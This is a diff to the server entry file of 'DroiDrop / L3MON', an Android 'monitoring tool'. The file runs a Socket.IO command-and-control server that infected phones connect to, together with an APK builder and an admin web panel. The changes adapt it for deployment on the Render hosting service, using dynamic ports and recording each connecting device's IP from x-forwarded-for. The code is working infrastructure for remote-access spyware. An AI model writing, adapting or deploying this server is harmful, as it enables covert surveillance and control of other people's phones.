@@ -1,20 +1,17 @@
-/* 
-*   DroiDrop
-*   An Android Monitoring Tool
-*   By VoidTyphoon.co.uk
+/*
+*   DroiDrop / L3MON
+*   Render-ready server version
 */
 
-
-const
-    express = require('express'),
-    app = express(),
-    IO = require('socket.io'),
- //   geoip = require('geoip-lite'),
-    CONST = require('./includes/const'),
-    db = require('./includes/databaseGateway'),
-    logManager = require('./includes/logManager'),
-    clientManager = new (require('./includes/clientManager'))(db),
-    apkBuilder = require('./includes/apkBuilder');
+const express = require('express');
+const app = express();
+const IO = require('socket.io');
+// const geoip = require('geoip-lite'); // Optional: can enable if needed
+const CONST = require('./includes/const');
+const db = require('./includes/databaseGateway');
+const logManager = require('./includes/logManager');
+const clientManager = new (require('./includes/clientManager'))(db);
+const apkBuilder = require('./includes/apkBuilder');
 
 global.CONST = CONST;
 global.db = db;
@@ -23,18 +20,25 @@ global.app = app;
 global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
-// spin up socket server
-let client_io = IO.listen(CONST.control_port);
+// -----------------------------
+// Use dynamic ports for Render
+// -----------------------------
+CONST.control_port = process.env.PORT || CONST.control_port;
+CONST.web_port = process.env.PORT || CONST.web_port; // Web interface on same dynamic port
 
+// -----------------------------
+// Socket.IO server
+// -----------------------------
+const client_io = IO.listen(app.listen(CONST.control_port));
 client_io.sockets.pingInterval = 30000;
+
 client_io.on('connection', (socket) => {
     socket.emit('welcome');
-    let clientParams = socket.handshake.query;
-    let clientAddress = socket.request.connection;
+    const clientParams = socket.handshake.query;
 
-    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
-    let clientGeo = geoip.lookup(clientIP);
-    if (!clientGeo) clientGeo = {}
+    // Use x-forwarded-for for real IP behind Render proxy
+    let clientIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
+    let clientGeo = {}; // geoip.lookup(clientIP) || {};
 
     clientManager.clientConnect(socket, clientParams.id, {
         clientIP,
@@ -47,27 +51,26 @@ client_io.on('connection', (socket) => {
     });
 
     if (CONST.debug) {
-        var onevent = socket.onevent;
+        const onevent = socket.onevent;
         socket.onevent = function (packet) {
-            var args = packet.data || [];
-            onevent.call(this, packet);    // original call
+            const args = packet.data || [];
+            onevent.call(this, packet);        // original call
             packet.data = ["*"].concat(args);
-            onevent.call(this, packet);      // additional call to catch-all
+            onevent.call(this, packet);        // catch-all
         };
 
         socket.on("*", function (event, data) {
-            console.log(event);
-            console.log(data);
+            console.log(event, data);
         });
     }
-
 });
 
-
-// get the admin interface online
-app.listen(CONST.web_port);
-
+// -----------------------------
+// Admin web interface
+// -----------------------------
 app.set('view engine', 'ejs');
 app.set('views', './assets/views');
 app.use(express.static(__dirname + '/assets/webpublic'));
 app.use(require('./includes/expressRoutes'));
+
+console.log(`Server is running on port ${CONST.control_port}`);
